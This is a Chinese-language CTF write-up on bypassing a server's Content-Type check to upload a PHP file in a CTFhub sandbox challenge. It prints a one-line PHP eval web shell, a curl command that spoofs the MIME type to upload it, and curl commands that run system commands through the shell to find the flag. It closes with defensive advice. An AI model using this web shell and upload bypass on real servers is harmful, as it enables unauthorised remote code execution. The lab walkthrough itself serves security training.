---
title: CTFhub 文件上传-MIME绕过
date: 2026-10-21
categories: CTFhub Web 文件上传
tags:  CTFhub Web 文件上传 MIME 类型伪造 Content-Type 绕过
---

# 题目：CTFhub 文件上传-MIME绕过

## 题目描述
打开题目页面，尝试直接上传 `shell.php`，可能会被拦截。
**分析：**
服务器会检查 HTTP 请求头中的 `Content-Type` 字段。如果它不是 `image/jpeg`、`image/png` 等图片格式，就会被拒绝。

## 解题思路

### 漏洞原理
MIME 验证（Content-Type 验证）是服务器检查上传文件类型的一种方式。但 `Content-Type` 是客户端（浏览器）在发送请求时自己带的，**完全可以被伪造**。
服务器如果不检查文件的真实内容（文件头）和后缀，仅依赖前端传来的 `Content-Type`，就会导致漏洞。

### 攻击链
1. 制作 PHP 木马 `shell.php`。
2. 使用 `curl` 发送请求，手动指定 `Content-Type` 为 `image/jpeg`。
3. 服务器被骗，接收 `.php` 文件。
4. 访问木马，执行命令拿 flag。

## 解题步骤
1. 编写 PHP 木马
在本地新建 `shell.php`，内容如下：
```php
<?php @eval($_POST['cmd']); ?>
```

2. 用 cURL 伪造 MIME 类型上传
打开 CMD，使用 curl 命令，通过 type=image/jpeg 伪造 MIME 类型：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/ -F "file=@shell.php;type=image/jpeg" -F "submit=Submit"
```
返回结果：
提示 上传成功，路径为 upload/shell.php。

3. 连马并获取 Flag
在 CMD 中执行：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('ls');"
```
发现成功执行，随后执行 find 命令：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('find / -name flag* 2>/dev/null');"
```
找到 /var/www/html/flag_769622042.php，cat 读取即可。
最终得到flag：ctfhub{240ee0dd298a86231fed4598}

## 踩坑指南
1. 直接在前端传 shell.php 被拦截
原因： 浏览器发送的 Content-Type 是 application/x-php，过不了服务器的检查。
解决： 不要用网页上传，直接用 curl 命令行发送请求，手动篡改 Content-Type。

## 知识点总结
1. 

| 知识点 | 说明 |
| :--- | :--- |
| MIME 验证 | 服务器检查请求头中的 `Content-Type` |
| Content-Type | HTTP 请求头，声明文件的类型（可伪造） |
| cURL 篡改 | 使用 `-F "file=@...;type=image/jpeg"` 强制指定文件类型 |

2. 防御建议
   1. 不要信任 Content-Type：服务器不能只看客户端传来的 MIME 类型。
   2. 校验文件头：读取文件前几个字节（魔数），判断真实类型。
   3. 白名单后缀：结合后缀和文件头双重校验
